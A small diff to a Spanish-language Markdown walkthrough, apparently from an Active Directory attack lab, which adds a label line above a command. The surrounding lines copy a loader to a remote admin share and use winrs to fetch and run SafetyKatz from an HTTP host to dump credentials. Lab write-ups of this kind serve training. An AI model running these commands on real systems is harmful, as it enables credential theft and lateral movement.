@@ -703,7 +703,7 @@ echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 
 Una vez copiado el *Loader* ejecutaremos *SafetyKatz* a traves de *winrs*
 ```shell
-
+[newShell as srvadmin privileges - CMD]
 winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.97:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
 ```
 
